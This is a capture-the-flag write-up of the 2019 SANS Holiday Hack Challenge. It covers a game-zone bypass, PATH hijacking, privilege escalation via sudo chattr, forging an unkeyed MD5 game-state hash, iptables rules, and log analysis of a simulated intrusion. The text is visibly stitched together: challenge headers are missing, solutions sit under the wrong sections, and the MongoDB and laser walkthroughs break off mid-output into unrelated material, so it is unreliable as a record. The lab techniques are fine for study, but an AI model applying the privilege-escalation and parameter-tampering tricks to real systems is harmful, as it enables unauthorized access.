# Kringlecon 2: Turtle Doves
This writeup is the collaborative work of:
- Polle Vanhoof
- Jan D'Herdt
- Honorable Mention goes out to Tudor Azoitei

For the 2019 SANS holiday hack challenge, Jan and myself decided to work together and tackle the interesting challenges presented by the SANS team. In the end, we completed all the challenges and objectives. As a nice bonus, we even stubled upon an oversight that allowed us to bypass all challenges and complete the game without completing any challenge.

We hope you enjoy this writeup as much as we enjoyed the game.

## Information Gathering
### Interacting with the game over websocket

The game started on a Friday evening and my colleague and I had agreed to start it together on Monday.
As a result, I was eagerly looking at the start of the event and trying to do anything other than actually working on the challenges.

I figured I would see how the game worked behind the scenes and started looking at the websocket traffic between my client and the server.
This quickly turned into a small project of itself. Soon I had a small script running and I decided I would use it to handle most of the information gathering.
A few hours later and [santas_little_helper.py](https://github.com/pollev/santas_little_helper) was born.

The following sections group the data we collected through the script.

### Oversight: End-Credits Bypass
While working on the data gathering script, I realized that I would need to automate the movement from room to room. The script could only pull data for a location after physically moving my character there. So I started working on a 'teleportation' option. The script interacts with the backend directly to move my character to each room, it then grabs all zone information it finds and stores it.

That info includes the new exit-portals for that specific zone. That means that, once we enter a zone, we can automatically figure out new locations we can go to and the script can then automate going to those new zones as well.

It turns out however that certain zones, which are supposed to only be accessible after completion of an objective, are still accessible if interacting with the websocket in this manner.
It is the client which refuses to enter these zones. The portals to the zones still exist, and we can force our way in by sending the appropriate command to the server. It seems the devs forgot to do some server side validation here.

After discovering this, I added a 'teleportation' feature to the script. Which can teleport your character directly to any zone (including the finale zone)

#### Solution
We have a look at the door keypad and see that the keys "1", "3" and "7" have been used.
We are also told that one of those numbers is used twice.

The immediate thing to try would be "1337" (or 'leet'). However this number is not prime. We could solve this challenge by grabbing a list of primes from the internet and removing all entries that have a digit not equal to 1, 3 or 7. We could then remove all entries that do not have a duplicate digit. We can then just write a script to try all the remaining possibilities.

Or you could do what we did, try the first options that come to your mind, one of them being '7331' (the reverse of 1337) and get lucky.

That's all there is to this challenge, we do however find a little easter egg on the wall inside the dorm after we enter the now unlocked door. It seems the ElfU students need a reminder sometimes and have written the code down on the wall.

I need to list files in my home/
To check on project logos
But what I see with ls there,
Are quotes from desert hobos...

which piece of my command does fail?
I surely cannot find it.
Make straight my path and locate that-
I'll praise your skill and sharp wit!

Get a listing (ls) of your current directory.
```

#### Solution
We quickly see that someone has messed with the path.

```
elf@bd2b9636c43a:~$ ls
This isn't the ls you're looking for
elf@bd2b9636c43a:~$ which ls
/usr/local/bin/ls
elf@bd2b9636c43a:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
There is a fake `ls` binary in /usr/local/bin. And that directory is first in our path.
As a result, linux will search that path first and find the bad `ls` binary and use it.

We could now fix the path, or just use the correct binary directly.
So we just run `/bin/ls` instead.

```
elf@bd2b9636c43a:~$ /bin/ls
```

That's it. We are done.

I love that nyancat!

Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
```

#### Solution
If we just try to `su` to alabaster_snowball, we see something very unexpected happen:
![NYAN-NYAN-NYAN](images/nyanshell.png)


We look at '/etc/passwd' to see what shell is being loaded for alabaster snowball:

```
elf@1fd924a3fa2c:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/bash
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
```

We notice that alabaster_snowball is running the strange shell `/bin/nsh`
if we look at this shell we see its permissions and notice that we should be able to overwrite it.
However, if we actually try, we get a permission denied

```
elf@1fd924a3fa2c:~$ ls -la /bin/nsh
-rwxrwxrwx 1 root root 75680 Dec 11 17:40 /bin/nsh
elf@1fd924a3fa2c:~$ echo '' > /bin/nsh
-bash: /bin/nsh: Operation not permitted
```
Looking at `sudo -l` we see that we are only allowed to run one specific command as root:
```
elf@1fd924a3fa2c:~$ sudo -l
Matching Defaults entries for elf on 1fd924a3fa2c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on 1fd924a3fa2c:
    (root) NOPASSWD: /usr/bin/chattr
```
So we can run `chattr`
The `chattr` command is used to change file attributes on a Linux file system.
Lets have a look at the current attributes for `/bin/nsh`

```
elf@1fd924a3fa2c:~$ lsattr /bin/nsh
----i---------e---- /bin/nsh
```

We see that the immutable flag is set. That is why we cannot overwrite the file.
We can however use the `chattr` command to remove this flag ourself.

```
elf@1fd924a3fa2c:~$ sudo /usr/bin/chattr -i /bin/nsh
elf@1fd924a3fa2c:~$ lsattr /bin/nsh
--------------e---- /bin/nsh
```

Indeed, now we can overwrite the shell. So we just overwrite it with the real bash shell and we are ready.
We then just `su` to alabaster_snowball with the provided credentials and we are done.

```
elf@1fd924a3fa2c:~$ cp /bin/bash /bin/nsh
elf@1fd924a3fa2c:~$ su alabaster_snowball
Password:
Loading, please wait......


You did it! Congratulations!
```

That's all there is to this challenge!

Hello dear player!  Won't you please come help me get my wish!
I'm searching teacher's database, but all I find are fish!
Do all his boating trips effect some database dilution?
It should not be this hard for me to find the quiz solution!

Find the solution hidden in the MongoDB on this system.
```


#### Solution
We start by trying to connect to the mongo database

```
elf@de490e548003:~$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
2019-12-17T15:00:26.355+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused
2019-12-17T15:00:26.356+0000 E QUERY    [thread1] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed


Hmm... what if Mongo isn't running on the default port?
```

It seems that we need to find the port mongo is listening on.
We can do this by running the following command:

```
elf@de490e548003:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18508  3496 pts/0    Ss   14:53   0:00 /bin/bash
mongo        9  0.5  0.0 1016780 59484 ?       Sl   14:53   0:02 /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
elf         54  0.0  0.0  34400  2928 pts/0    R+   15:01   0:00 ps aux
```
Alternatively, we could have checked out `sudo -l`
```
elf@de490e548003:~$ sudo -l
User elf may run the following commands on de490e548003:
    (mongo) NOPASSWD: /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath\=/tmp/mongo.log
    (root) SETENV: NOPASSWD: /usr/bin/python /updater.py
```
In either case, we see that there is a mongo process running with the port flag 12121.
We connect to it and look around:
```
elf@de490e548003:/tmp$ mongo localhost:12121
MongoDB shell version v3.6.3
connecting to: mongodb://localhost:12121/test

#### MOTD
When we start the terminal, we are greeted with the following message (I added an image rahter than a transcript to preserve the coloring here):
![Smart braces motd](images/smart_braces_motd.png)

#### Solution
This challenge is timed. You need to complete the iptables rules within 5 minutes. Note that there is nothing stopping you from trying multiple times. So the time limitation is not much of a problem.
We start by checking out the IOT Teeth Braces document:
```
elfuuser@e8bce7331ea7:~$ cat /home/elfuuser/IOTteethBraces.md 
# ElfU Research Labs - Smart Braces
### A Lightweight Linux Device for Teeth Braces
### Imagined and Created by ElfU Student Kent TinselTooth

This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please 
refer to the management documentation for this purpose.

## Proper Firewall configuration:

The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:

> sudo iptables -P FORWARD DROP

The following is an example of allowing traffic from a specific IP and to a specific port:

> sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT


A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
```

Let's implement these rules.

```
elfuuser@e8bce7331ea7:~$ sudo iptables -P INPUT DROP
elfuuser@e8bce7331ea7:~$ sudo iptables -P FORWARD DROP
elfuuser@e8bce7331ea7:~$ sudo iptables -P OUTPUT DROP

elfuuser@e8bce7331ea7:~$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
elfuuser@e8bce7331ea7:~$ sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

elfuuser@e8bce7331ea7:~$ sudo iptables -A INPUT -p tcp -s 172.19.0.225 --dport 22 -j ACCEPT
elfuuser@e8bce7331ea7:~$ sudo iptables -A OUTPUT -p tcp -d 172.19.0.225 --sport 22 -j ACCEPT

elfuuser@e8bce7331ea7:~$ sudo iptables -A INPUT -p tcp -m multiport --dports 21,80 -j ACCEPT
elfuuser@e8bce7331ea7:~$ sudo iptables -A OUTPUT -p tcp -m multiport --sports 21,80 -j ACCEPT

elfuuser@e8bce7331ea7:~$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT

elfuuser@e8bce7331ea7:~$ sudo iptables -A INPUT -i lo -j ACCEPT
```
We now wait a couple seconds for the background task to verify our rules and we are done.


NOTE:
> There seemed to be some small issues with this challenge where if you did not allow the MOTD to slowly play out, it would no longer properly verify your rules later.

#### Game Overview
The game is a reference to the legendary game series [Oregon Trail](https://en.wikipedia.org/wiki/The_Oregon_Trail_(series)).
When we start we get to select our difficulty. The difficulty refers to how hard it is to hack into the game, not just the difficulty of the game itself.
The game can be properly played, but the goal is ofcourse to win it by cheating.


Here are some screenshots to give you an idea of what this is all about.


First we can select our difficulty:

![Trail Select Game](images/trail_select_game.png)

Then we always start at the following shop screen. There are some interesting things you can do here, but all challenges can be solved without really interacting with this screen. So we just always accept the default values and continue.

![Trail Shop](images/trail_shop.png)

The next image shows what the game itself looks like. Note the 'URL-bar' to simulate a real browser game.
The goal is to cover the distance of 8000 without losing all your characters. Pressing 'Go' will increase your distance travelled and trigger all kinds of events.

![Trail Easy](images/trail_easy.png)

If you manage to complete the game, the result looks like this:

![Trail Solved](images/trail_solved.png)

#### Solution
We will go over each of the difficulties, even though only one is required to get the achievement.

##### Easy mode
We start of course with the easy challenge. We notice from the screenshots above that the URL contains a buch of GET parameters.
Remember that the goal is to cover the full 8000 distance without losing before that point.

We immediately notice the 'distance' parameter in the url bar. We try to update it to 7999 and press enter.
The game screen updates to this:

![Trail Easy Solution](images/trail_easy_solution.png)

Great! We kept all our guys alive and we only need to travel a distance of 1 now. We simply press 'Go' once and we have completed the first challenge!

##### Medium mode
We load into the medium difficulty version of the game and notice one huge difference, the parameters are no longer in the URL!

![Trail Medium](images/trail_medium.png)

This time, they are being passed as POST parameters. We could easily intercept the requests with burp and modify them how we want, but lets keep it even more simple.
We can just have a look at the page source and notice that there is a `<div>` element called `statusContainer`. This value contains all the variables that were previously kept in the url bar.
We update again the value of distance to 7999.

![Trail Medium Solution](images/trail_medium_solution.png)

We now press 'Go' once and we have completed the Medium challenge!

##### Hard mode
This is where things get interesting. This challenge is identical to the medium difficulty, with one key exception.
The `statusContainer` object this time also contains a hash value. The server sends us this hash value together with all of the other status values.

![Trail Hard](images/trail_hard.png)

This hash is taken on the server side over all of the other status values. If we update any values and send them back to the server, the server will compare them to the hash we send it.
If they do not match, the server will reject our request and tell us that we have an issue:

![Trail Hard Oops](images/trail_hard_oops.png)

While we were originally stuck here for a little while, we decided to throw one of the hashes we received in [crackstation](https://crackstation.net/). To our suprise, the hash was known:

![Trail Crackstation](images/crackstation.png)

The Hash is just an md5 of the value '1626'! This tells us two important things:
1. The server is not using a key to secure their hashes
2. The hashes are of a (very simple) numeric value

After playing around with the game status and the received hashes for a while, we determined that the server was just adding up all the status values and taking a hash of the total. We could have also figured this out by watching the talk [Web Apps: A Trailhead](https://www.youtube.com/watch?v=0T6-DQtzCgM). At a certain point, the server side code for calculating the hash shows up on screen, also showing us how the hash value is being calculated:

![Trail Talk](images/trail_talk.png)

Our objective is now simple, we update two values:
- The distance
- The hash

Start of with a clean slate (hash of value 1626) and we increase the distance from 0 to 7999. We then generate a hash `md5(1626 + 7999)` and change the hash value to reflect that.
In linux we can do this easily:
```
polle@polle-pc:~ $ echo -n "$((1626 + 7999))" | md5sum
a330f9fecc388ce67f87b09855480ca3  -
```
There we have our new hash value. We update both values in the source code as we did for the medium challenge and we press 'Go' once.

We have completed the hard challenge! That was fun!

#### Solution
Upon logging in with the provided credentials, we end up on the search interface for graylog.

![Graylog](images/graylog_main.png)

We are provided with 10 different challenges that we need to solve.

##### Challenge 1
Objective:
> Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.
> What is the full-path + filename of the first malicious file downloaded by Minty?

Solution:
> C:\Users\minty\Downloads\cookie_recipe.exe

Search:  
We can simply search the logs for a filename containing the word cookie.
```
TargetFilename:/.+cookie.+/
```


##### Challenge 2
Objective:
> The malicious file downloaded and executed by Minty gave the attacker remote access to his machine.
> What was the ip:port the malicious file connected to first?

Solution:
> 192.168.247.175:4444

Search:  
```
CommandLine:/.+cookie_recipe.exe/
```
Now find the execution of the .exe and search for events in a scope of 1 minute around that event.
We then also quickly find the network connection.  

Alternatively, we can look for
```
ProcessImage:/.+cookie_recipe.exe/
```
And find the EventID of 3 (network traffic)

##### Challenge 3
Objective:
> What was the first command executed by the attacker?

Solution:
> whoami

Search:  
We can search for all commands (processes) that have the cookie recipe as the parent process
```
ParentProcessImage:/.+cookie_recipe.+/
```

##### Challenge 4
Objective:
> What is the one-word service name the attacker used to escalate privileges?

Solution:
> webexservice

Search:  
We can reuse the last search we did
```
ParentProcessImage:/.+cookie_recipe.+/
```
And then track the userAccount value for each process over time.
We will see that soon the user executing commands with the cookie scripts as parent process is no longer minty.
The last action executed as minty shows us the process used to escalate.

![Graylog Privesc](images/graylog_last_user.png)

Do note that our regex search includes both the `cookie_recipe.exe` and `cookie_recipe2.exe` processes.


##### Challenge 5
Objective:
> What is the file-path + filename of the binary ran by the attacker to dump credentials?

Solution:
> C:\cookie.exe

Search:  
We continue with the same search string we were using before.
```
ParentProcessImage:/.+cookie_recipe.+/
```
We see that the attacker mistypes and tries to run mimikatz. He then corrects himself and runs the binary named cookie.exe.


##### Challenge 6
Objective:
> The attacker pivoted to another workstation using credentials gained from Minty's computer.
> Which account name was used to pivot to another machine?

Solution:
> alabaster

Search:  
Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress.
```
EventID: 4624 AND SourceNetworkAddress:192.168.247.175
```


##### Challenge 7
Objective:
> What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?

Solution:
> 06:04:28

Search:  
LogonType 10 is used for successful network connections using the RDP client.
```
EventID: 4624 AND LogonType:10
```

##### Challenge 8
Objective:
> The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host.
> What is the SourceHostName,DestinationHostname,LogonType of this connection?

Solution:
> elfu-res-wks2,elfu-res-wks3,3

Search:  
The attacker has GUI access to workstation 2 via RDP.
They likely use this GUI connection to access the file system of workstation 3 using explorer.exe via UNC file paths.
This is likely why we don't see any cmd.exe or powershell.exe processes.
```
SourceHostName:"ELFU-RES-WKS2" AND EventID:4624
```
However, we still see the successful network authentication for this with event id 4624 and logon type 3.

##### Challenge 9
Objective:
> What is the full-path + filename of the secret research document after being transferred from the third host to the second host?

Solution:
> C:\Users\alabaster\Desktop\super\_secret\_elfu\_research.pdf

Search:  
We can look for sysmon file creation event id of 2 with a source of workstation 2.
We can also use regex to filter out overly common file paths using something like:
```
source:"elfu-res-wks2" AND EventID:2 AND NOT TargetFilename:/.+AppData.+/ AND NOT TargetFilename:/.+updatestore.+/ AND NOT TargetFilename:/.+AppData.+/
```

##### Challenge 10
Objective:
> What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?

Solution:
> 104.22.3.84

Search:  
We can look for the original document in CommandLine using regex.
```
super_secret_elfu_research.pdf
```
When we do that, we see a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php.
We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.

Alternatively, select the poweshell command and view events in a 5 seconds window around it.

That is all for the graylog terminal!

🗲 Elf University Student Research Terminal - Christmas Cheer Laser Project       🗲
🗲 ------------------------------------------------------------------------------ 🗲
🗲 The research department at Elf University is currently working on a top-secret 🗲
🗲 Laser which shoots laser beams of Christmas cheer at a range of hundreds of    🗲
🗲 miles. The student research team was successfully able to tweak the laser to   🗲
🗲 JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   🗲
🗲 Unfortunately, someone broke into the research terminal, changed the laser     🗲
🗲 settings through the Web API and left a note behind at /home/callingcard.txt.  🗲
🗲 Read the calling card and follow the clues to find the correct laser Settings. 🗲
🗲 Apply these correct settings to the laser using it's Web API to achieve laser  🗲
🗲 output of 5 Mega-Jollies per liter.                                            🗲
🗲                                                                                🗲
🗲 Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info.  🗲
🗲                                                                                🗲
🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲
```


#### Solution
As the MOTD tells us, we have a look at the callingcard.

```
PS /home/elf> type /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
```

It clearly tells us that we should have a look at the command history on this machine.
Before we do that though, let's also have a look at the URI from the MOTD:

```
PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
HTTP/1.0 200 OK
Server: Werkzeug/0.16.0
Server: Python/3.6.9
Date: Tue, 17 Dec 2019 09:19:54 GMT

Content-Length: 860

<html>
<body>
<pre>
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
----------------------------------------------------
</pre>
</body>
</html>
```

That seems to give us a clear set of instructions to turn on the laser. It seems that we need to
1. Shut down the laser
2. Update the refraction, temperature and angle values with GET requests
3. Update the gaseous element mixture with a POST request
4. Turn on the laser
5. Check the laser output.

In order to do that though, we will need to find the correct settings first.
So let's first have a look at the command history

```
PS /home/elf> Get-History

  Id CommandLine
  -- -----------
   1 Get-Help -Name Get-Process
   2 Get-Help -Name Get-*
   3 Set-ExecutionPolicy Unrestricted
   4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm
   5 Get-Service | Export-CSV c:\service.csv
   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv
   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
   8 Get-EventLog -Log "Application"
   9 I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items.
  10 (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
```

We immediately notice the value for the angle (`angle?val=65.5`). We cannot be sure that this is the correct value, but we absolutely note it down in case it turns out to be.

We also get another clue:
> I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items.

This is referring to name-value pairs system wide. We should have a look at the environment variables

```

We see a new hint for us to follow:
> Squeezed and compressed I am hidden away.
> Expand me from my prison and I will show you the way.
> Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.


We search for the archive and find it quickly.
We then extract it and find two things inside:
- A binary file
- A new hint.

```
PS /etc> gci -R | sort LastWriteTime -Descending

```

We can run the binary after we properly set it's permissions. This is a linux system so we use chmod to make this binary executable.

```
PS /tmp/out/refraction> chmod +x ./runme.elf
PS /tmp/out/refraction> ./runme.elf
refraction?val=1.867
```

Excellent, we found the value for refraction (`refraction?val=1.867`). We now check out the riddle file.

```
PS /tmp/out/refraction> type ./riddle
Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

25520151A320B5B0D21561F92C8F6224
```

So, we need to get a list of md5 hashes for each file in the home directory and then find the one that matches the given md5 hash.
We can do so using the following powershell command:

```
PS /home/elf> Get-ChildItem -R -File | Foreach {Get-FileHash -Algorithm MD5 $_.fullname} | Where-Object {$_.Hash -eq '25520151A320B5B0D21561F92C8F6224'}

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             25520151A320B5B0D21561F92C8F6224                                       /home/elf/depths/produce/thhy5hll.txt

PS /home/elf> type /home/elf/depths/produce/thhy5hll.txt
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
```

Great, we find the correct setting for the temperature (`temperature?val=-33.5`). We also see a new hint telling us to sort all the files on their fullname size.
We can do this fairly easily, do note that we need `Format-List` to make sure we get the full output.

```
PS /home/elf> gci -R -File | select-object FullName, @{Name="Nlength";Expression={$_.FullName.Length}} | sort-object Nlength | select -last 1 | Format-List

Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.
```

Still no additional settings, but more instructions to follow!
We need to list all the event id's in the file, count them, sort them and figure out which event only appears once:

```
PS /tmp/out/refraction> gci -R /etc -include *.xml -ErrorAction 'SilentlyContinue'


    Directory: /etc/systemd/system/timers.target.wants

Mode                LastWriteTime         Length Name

    2       <I32 N="Id">4</I32>
    1       <I32 N="Id">1</I32>
```

We see that event with id '1' only appears one time. We now display the text around this event:


```

We find here the post body for the correct gases.
```
$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}
```


Final Values:

- angle?val=65.5
- refraction?val=1.867
- temperature?val=-33.5
- Gasses:
  - O=6
  - H=7
  - He=3
  - N=4
  - Ne=22
  - Ar=11
  - Xe=10
  - F=20
  - Kr=8
  - Rn=9

So we can now submit these values to the laser:

```

Challenge-url:  
https://docker2019.kringlecon.com/?challenge=jq


Location:  
sleighshop (Sleigh Workshop)

#### MOTD
When we start the terminal, we are greeted with the following message:
```
Some JSON files can get quite busy.
There's lots to see and do.
Does C&C lurk in our data?
JQ's the tool for you!

-Wunorse Openslae

Identify the destination IP address with the longest connection duration
using the supplied Zeek logfile. Run runtoanswer to submit your answer.
```

#### Solution
We start by having a look at the type of data we are dealing with:
```
cat conn.log | jq
```

We see that most entries have a `duration` field.
We can try to sort on that fields as a numeric value.

```
elf@51570ada4eb2:~$ cat conn.log | jq ".duration" | sort -g | uniq | tail -n 1
1019365.337758
```

Now we can check what connection that IP belongs to.

```
elf@51570ada4eb2:~$ cat conn.log | jq ". | select (.duration == 1019365.337758)"
{
  "ts": "2019-04-18T21:27:45.402479Z",
  "uid": "CmYAZn10sInxVD5WWd",
  "id.orig_h": "192.168.52.132",
  "id.orig_p": 8,
  "id.resp_h": "13.107.21.200",
  "id.resp_p": 0,
  "proto": "icmp",
  "duration": 1019365.337758,
  "orig_bytes": 30781920,
  "resp_bytes": 30382240,
  "conn_state": "OTH",
  "missed_bytes": 0,
  "orig_pkts": 961935,
  "orig_ip_bytes": 57716100,
  "resp_pkts": 949445,
  "resp_ip_bytes": 56966700
}
```

Great, we see the destination IP of `13.107.21.200`. We can now submit this to the `runtoanswer` tool

```
elf@51570ada4eb2:~$ runtoanswer 
Loading, please wait......



What is the destination IP address with the longes connection duration? 13.107.21.200



Thank you for your analysis, you are spot-on.
I would have been working on that until the early dawn.
Now that you know the features of jq,
You'll be able to answer other challenges too.

-Wunorse Openslae

Congratulations!
```

That's it. We are done.

![Threatening Document](images/threatening_document_location.png)

We obtain the following file:

[LetterToElfUPersonnel.pdf](relevant_files/LetterToElfUPersonnel.pdf)

Just copy paste the text below the confidential boxes into a text file

Full letter text:
```
Date: February 28, 2019

To the Administration, Faculty, and Staff of Elf University 17 Christmas Tree Lane North Pole
From: A Concerned and Aggrieved Character
Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters... OR ELSE!

Attention All Elf University Personnel,

It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree.
We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters.
For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called “Holiday Season.”

There are many other perfectly fine holidays and mythical characters that need your direct support year-round.

If you do not accede to our demands, we will be forced to take matters into our own hands.
We do not make this threat lightly.
You have less than six months to act demonstrably.

Sincerely,
--A Concerned and Aggrieved Character
```

#### Code
The challenge code is `DEMAND`


-----------------------------
### Windows Log Analysis: Evaluate Attack Outcome
#### Context
Objective
> We're seeing attacks against the Elf U domain!
> Using the event log data, identify the user account that the attacker compromised using a password spray attack.
> Bushy Evergreen is hanging out in the train station and may be able to help you out.


Hint:
Bushy Evergreen
> Wow, that was much easier than I'd thought.
> Maybe I don't need a clunky GUI after all!
> Have you taken a look at the password spray attack artifacts?
> I'll bet that DeepBlueCLI tool is helpful.
> You can check it out on GitHub.
> It was written by that Eric Conrad.
> He lives in Maine - not too far from here!


Event data log:  
https://downloads.elfu.org/Security.evtx.zip


DeepBlueCLI tool:  
https://github.com/sans-blue-team/DeepBlueCLI


#### Solution
##### Manual Solution
We can find it pretty easily by looking at the windows event logs manually.
1. We filter for eventid 4625 and 4624 (login failed and login success).
2. Sort by date and time.
3. Find 4624. That's it.

#### DeepBlueCLI solution
We can run the tool as follows:

```
C:\Users\cmdo\Desktop\test\DeepBlueCLI > .\DeepBlue.ps1 ..\Security.evtx
```

This will output a significant amount of data and show us that there has been a password spay attempt for the following usernames:
```
Target Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebuns
          tcandybaubles bbrandyleaves bevergreen lstripyleaves gchocolatewine ltrufflefig wopenslae mstripysleigh
          pbrandyberry civysparkles sscarletpie ftwinklestockings cstripyfluff gcandyfluff smullingfluff hcandysnaps
          mbrandybells twinterfig supatree civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves
```
All of them taking place on 19/11/2019 around 13:22.
We can then just open the event log and find a successful login (4624) around this time.

We determine that user `supatree` has been compromised

#### Code
The challenge code is `supatree`


-----------------------------
### Windows Log Analysis: Determine Attacker Technique
#### Context
Objective
> Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process.
> For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.


Hint:
SugarPlum Mary
> Oh there they are!  Now I can delete them.  Thanks!
> Have you tried the Sysmon and EQL challenge?
> If you aren't familiar with Sysmon, Carlos Perez has some great info about it.
> Haven't heard of the Event Query Language?
> Check out some of [Ross Wolf](https://www.endgame.com/our-experts/ross-wolf)'s work on EQL or that blog post by Josh Wright in your badge.


Sysmon logs:  
https://downloads.elfu.org/sysmon-data.json.zip


Josh Wright blog post:  
https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/


#### Solution
We can use EQL to search the json data.
We search for lsass processes:

```
root@pv-kali:~/Desktop/logs# eql query -f sysmon-data.json "process where command_line = '*lsass*'" | jq
root@pv-kali:~/Desktop/logs# eql query -f sysmon-data.json "process where process_name = '*lsass*'" | jq
root@pv-kali:~/Desktop/logs# eql query -f sysmon-data.json "process where parent_process_name = '*lsass*'" | jq
{
  "command_line": "C:\\Windows\\system32\\cmd.exe",
  "event_type": "process",
  "logon_id": 999,
  "parent_process_name": "lsass.exe",
  "parent_process_path": "C:\\Windows\\System32\\lsass.exe",
  "pid": 3440,
  "ppid": 632,
  "process_name": "cmd.exe",
  "process_path": "C:\\Windows\\System32\\cmd.exe",
  "subtype": "create",
  "timestamp": 132186398356220000,
  "unique_pid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
  "unique_ppid": "{7431d376-cd7f-5dd3-0000-001013920000}",
  "user": "NT AUTHORITY\\SYSTEM",
  "user_domain": "NT AUTHORITY",
  "user_name": "SYSTEM"
}
```

We see only one time that lsass.exe has been run.
We can now search for the user (999) and limit the time to a few seconds around this event.


